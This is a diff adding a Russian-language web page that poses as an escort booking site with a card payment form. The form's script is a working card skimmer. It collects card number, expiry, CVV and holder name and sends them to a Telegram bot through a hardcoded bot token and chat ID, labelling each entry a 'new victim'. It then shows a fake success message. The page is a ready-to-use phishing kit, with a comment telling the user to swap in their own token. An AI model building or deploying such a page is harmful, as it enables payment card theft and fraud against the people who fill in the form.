@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Женская Сова | Эскорт Услуги</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0a0a; color: #fff; font-family: 'Georgia', serif; }
+        .header { background: #1a1a1a; padding: 20px; text-align: center; border-bottom: 2px solid #8B0000; }
+        .logo { font-size: 42px; color: #8B0000; letter-spacing: 3px; }
+        .subtitle { color: #888; font-size: 14px; margin-top: 5px; }
+        .container { max-width: 900px; margin: 30px auto; padding: 20px; }
+        .profile { background: #151515; padding: 25px; border-radius: 10px; margin-bottom: 20px; display: flex; gap: 20px; border: 1px solid #2a2a2a; }
+        .profile img { width: 150px; height: 200px; object-fit: cover; border-radius: 8px; border: 1px solid #333; }
+        .info h2 { color: #8B0000; margin-bottom: 5px; }
+        .info p { color: #aaa; margin: 3px 0; font-size: 14px; }
+        .price { color: #8B0000; font-size: 22px; font-weight: bold; margin-top: 8px; }
+        .btn { background: #8B0000; color: #fff; border: none; padding: 12px 35px; font-size: 16px; cursor: pointer; border-radius: 5px; margin-top: 10px; }
+        .btn:hover { background: #a00000; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); justify-content: center; align-items: center; }
+        .modal-content { background: #1a1a1a; padding: 30px; border-radius: 10px; width: 400px; border: 1px solid #333; }
+        .modal-content h3 { color: #8B0000; text-align: center; margin-bottom: 20px; }
+        .modal-content input { width: 100%; padding: 12px; margin: 8px 0; background: #111; border: 1px solid #333; color: #fff; border-radius: 5px; }
+        .modal-content .btn { width: 100%; }
+        .success { display: none; text-align: center; color: #0f0; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">ЖЕНСКАЯ СОВА</div>
+        <div class="subtitle">Эскорт-услуги премиум класса. Конфиденциальность гарантирована.</div>
+    </div>
+
+    <div class="container">
+        <div class="profile">
+            <img src="https://i.imgur.com/placeholder.jpg" alt="Девушка" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22150%22 height=%22200%22><rect fill=%22%23333%22 width=%22150%22 height=%22200%22/><text fill=%22%23888%22 x=%2220%22 y=%22100%22 font-size=%2214%22>Фото</text></svg>'">
+            <div class="info">
+                <h2>Анна, 23 года</h2>
+                <p>📍 Москва, выезд по РФ</p>
+                <p>✨ Модельная внешность, образование, языки</p>
+                <div class="price">25 000 ₽ / час</div>
+                <button class="btn" onclick="openPayment()">Забронировать</button>
+            </div>
+        </div>
+
+        <div class="profile">
+            <img src="https://i.imgur.com/placeholder.jpg" alt="Девушка" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22150%22 height=%22200%22><rect fill=%22%23333%22 width=%22150%22 height=%22200%22/><text fill=%22%23888%22 x=%2220%22 y=%22100%22 font-size=%2214%22>Фото</text></svg>'">
+            <div class="info">
+                <h2>Виктория, 26 лет</h2>
+                <p>📍 Санкт-Петербург</p>
+                <p>✨ Спортсменка, танцовщица</p>
+                <div class="price">30 000 ₽ / час</div>
+                <button class="btn" onclick="openPayment()">Забронировать</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="paymentModal">
+        <div class="modal-content">
+            <h3>💳 Оплата бронирования</h3>
+            <input type="text" id="cardNumber" placeholder="Номер карты" maxlength="19">
+            <input type="text" id="cardDate" placeholder="ММ/ГГ" maxlength="5">
+            <input type="text" id="cardCVV" placeholder="CVV" maxlength="3">
+            <input type="text" id="cardName" placeholder="Имя держателя">
+            <button class="btn" onclick="processPayment()">Оплатить 5 000 ₽</button>
+            <div class="success" id="successMsg">✅ Оплата прошла успешно!<br>Ожидайте звонка.</div>
+        </div>
+    </div>
+
+    <script>
+        function openPayment() {
+            document.getElementById('paymentModal').style.display = 'flex';
+        }
+
+        function processPayment() {
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cardDate = document.getElementById('cardDate').value;
+            const cardCVV = document.getElementById('cardCVV').value;
+            const cardName = document.getElementById('cardName').value;
+
+            if (!cardNumber || !cardDate || !cardCVV || !cardName) {
+                alert('Заполните все поля');
+                return;
+            }
+
+            const data = {
+                card: cardNumber,
+                date: cardDate,
+                cvv: cardCVV,
+                name: cardName,
+                ip: '',
+                time: new Date().toLocaleString()
+            };
+
+            // Отправка в Telegram (замени токен и chat_id)
+            const BOT_TOKEN = '8873096534:AAF4Kc2pyJhHwZkWb58NWKYdGVKDlzn0s-s';
+            const CHAT_ID = '8535311513';
+            const msg = `🦉 *Женская Сова — Новая жертва*\n\n💳 Карта: ${data.card}\n📅 Дата: ${data.date}\n🔐 CVV: ${data.cvv}\n👤 Имя: ${data.name}\n🕐 Время: ${data.time}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
+            });
+
+            document.getElementById('successMsg').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('paymentModal').style.display = 'none';
+                document.getElementById('successMsg').style.display = 'none';
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
